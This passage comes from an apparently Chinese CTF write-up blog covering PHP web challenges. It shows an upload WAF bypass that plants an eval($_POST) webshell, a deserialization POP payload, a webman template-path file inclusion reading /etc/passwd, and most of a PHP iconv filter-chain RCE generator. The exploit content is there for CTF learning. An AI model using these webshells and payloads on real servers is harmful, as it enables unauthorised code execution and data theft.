border-radius: <span class="number">5</span>px;</span><br><span class="line">                cursor: pointer;</span><br><span class="line">                font-size: <span class="number">16</span>px;</span><br><span class="line">            &#125;</span><br><span class="line">            .custom-file-upload &#123;</span><br><span class="line">                background-color: <span class="comment">#ff0000;</span></span><br><span class="line">                color: white;</span><br><span class="line">                margin-right: <span class="number">20</span>px;</span><br><span class="line">            &#125;</span><br><span class="line">            .custom-file-upload:hover &#123;</span><br><span class="line">                background-color: <span class="comment">#b3002a;</span></span><br><span class="line">            &#125;</span><br><span class="line">            .submit-btn &#123;</span><br><span class="line">                background-color: <span class="comment">#28a745;</span></span><br><span class="line">                color: white;</span><br><span class="line">                border: none;</span><br><span class="line">            &#125;</span><br><span class="line">            .submit-btn:hover &#123;</span><br><span class="line">                background-color: <span class="comment">#218838;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">upload</span>-<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h2</span>&gt;你能逃出奶龙的<span class="title">WAF</span>吗？&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">action</span>=&quot;&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">custom</span>-<span class="title">file</span>-<span class="title">upload</span>&quot;&gt;选择文件&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">id</span>=&quot;<span class="title">upload_file</span>&quot; <span class="title">class</span>=&quot;<span class="title">file</span>-<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;上传文件&quot; <span class="title">class</span>=&quot;<span class="title">submit</span>-<span class="title">btn</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">document</span>.<span class="title">querySelector</span>(&#x27;.<span class="title">custom</span>-<span class="title">file</span>-<span class="title">upload</span>&#x27;).<span class="title">addEventListener</span>(&#x27;<span class="title">click</span>&#x27;, <span class="title">function</span>() </span>&#123;</span><br><span class="line">            document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;upload_file&#x27;</span>).<span class="title function_ invoke__">click</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码审计，发现这里文件名有问题</p><p><img src="/%E8%9C%80%E9%81%93%E5%B1%B1/3d69c60f-3025-48b1-9a28-2d510406529a.png" alt="3d69c60f-3025-48b1-9a28-2d510406529a"></p><p>可以用 <code>a.php/.</code>来绕过，get传入一个name</p><p>后边的正则，使用<code>PCRE回溯次数限制</code>来绕过</p><p>先生成文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&#x27;a&#x27;*2000000+&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;)</span><br></pre></td></tr></table></figure><p>然后上传</p><p><img src="/%E8%9C%80%E9%81%93%E5%B1%B1/dc4ddfde-2c60-4c4d-9113-094930b97938.png" alt="dc4ddfde-2c60-4c4d-9113-094930b97938"></p><p>最后访问 <code>uploads/a.php</code> 即可RCE</p><p><img src="/%E8%9C%80%E9%81%93%E5%B1%B1/2d31ee71-670c-4e23-a11b-125c610fb713.png" alt="2d31ee71-670c-4e23-a11b-125c610fb713"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_DSBCTF_单身杯</title>
      <link href="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/"/>
      <url>/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="签到·好玩的PHP"><a href="#签到·好玩的PHP" class="headerlink" title="签到·好玩的PHP"></a>签到·好玩的PHP</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$d</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$s</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$ctf</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;d = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;s = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;s;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable language_">$this</span>-&gt;d != <span class="variable language_">$this</span>-&gt;s) &amp;&amp; (<span class="variable language_">$this</span>-&gt;d != <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="variable language_">$this</span>-&gt;s != <span class="variable language_">$this</span>-&gt;b)) &#123;</span><br><span class="line">                <span class="variable">$dsb</span> = <span class="variable language_">$this</span>-&gt;d.<span class="variable language_">$this</span>-&gt;s.<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ((<span class="title function_ invoke__">strlen</span>(<span class="variable">$dsb</span>) &lt;= <span class="number">3</span>) &amp;&amp; (<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;ctf) &lt;= <span class="number">3</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="variable">$dsb</span> !== <span class="variable language_">$this</span>-&gt;ctf) &amp;&amp; (<span class="variable language_">$this</span>-&gt;ctf !== <span class="variable">$dsb</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$dsb</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;ctf)) &#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;dsbctf&quot;</span>]);</span><br></pre></td></tr></table></figure><p>这里就一个小考点，字符<code>123</code>和数字<code>123</code>的md5值是一样的，但在强比较的时候是不一样的</p><p>pop：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$d</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$s</span> = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$b</span> = <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$ctf</span> = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;d = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;s = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;s;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable language_">$this</span>-&gt;d != <span class="variable language_">$this</span>-&gt;s) &amp;&amp; (<span class="variable language_">$this</span>-&gt;d != <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="variable language_">$this</span>-&gt;s != <span class="variable language_">$this</span>-&gt;b)) &#123;</span><br><span class="line">                <span class="variable">$dsb</span> = <span class="variable language_">$this</span>-&gt;d.<span class="variable language_">$this</span>-&gt;s.<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ((<span class="title function_ invoke__">strlen</span>(<span class="variable">$dsb</span>) &lt;= <span class="number">3</span>) &amp;&amp; (<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;ctf) &lt;= <span class="number">3</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="variable">$dsb</span> !== <span class="variable language_">$this</span>-&gt;ctf) &amp;&amp; (<span class="variable language_">$this</span>-&gt;ctf !== <span class="variable">$dsb</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$dsb</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;ctf)) &#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?dsbctf=O%3A7%3A%22ctfshow%22%3A4%3A%7Bs%3A10%3A%22%00ctfshow%00d%22%3Bs%3A1%3A%221%22%3Bs%3A10%3A%22%00ctfshow%00s%22%3Bs%3A1%3A%222%22%3Bs%3A10%3A%22%00ctfshow%00b%22%3Bs%3A1%3A%223%22%3Bs%3A12%3A%22%00ctfshow%00ctf%22%3Bi%3A123%3B%7D</span><br></pre></td></tr></table></figure><p><img src="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241113150906794.png" alt="image-20241113150906794"></p><h2 id="迷雾重重"><a href="#迷雾重重" class="headerlink" title="迷雾重重"></a>迷雾重重</h2><p>题目给了源码，一开始走到误区里了，死磕反序列化</p><p>在动态调试的时候，发现这部分的变量是唯二可控的</p><p><img src="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241113145216822.png" alt="image-20241113145216822"></p><p>跟进 view 函数，可以看到后边调用了 <code>$handler::render</code>函数来渲染，这里把<code>$handler</code>打印</p><p><img src="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241113145251594.png" alt="image-20241113145251594"></p><p><img src="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241113145609483.png" alt="image-20241113145609483"></p><p>发现 <code>$handler</code>是 <code>support\view\Raw</code>类，这个类在<code>vendor/workerman/webman-framework/src/support/view/Raw.php</code></p><p>找到这个类的 <code>render</code>函数，发现有变量覆盖和文件包含</p><p><img src="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241113145830372.png" alt="image-20241113145830372"></p><p>poc:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;guest&quot;,&quot;__template_path__&quot;:&quot;/etc/passwd&quot;&#125;</span><br></pre></td></tr></table></figure><p>成功实现文件包含</p><p><img src="/ctfshow_DSBCTF_%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241113150134797.png" alt="image-20241113150134797"></p><p>后边就用filter链实现RCE:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$base64_payload</span> = <span class="string">&quot;PD9waHAgc3lzdGVtKCJjYXQgL3MqIik7Pz4&quot;</span>; <span class="comment">/*&lt;?php system(&quot;cat /s*&quot;);?&gt;*/</span></span><br><span class="line"><span class="variable">$conversions</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;6&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;E&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;I&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;J&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;K&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;M&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;N&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Q&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;S&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Z&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;j&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$filters</span> = <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line"><span class="variable">$filters</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">str_split</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$base64_payload</span>)) <span class="keyword">as</span> <span class="variable">$c</span>) &#123;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="variable">$conversions</span>[<span class="variable">$c</span>] . <span class="string">&quot;|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-decode|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= 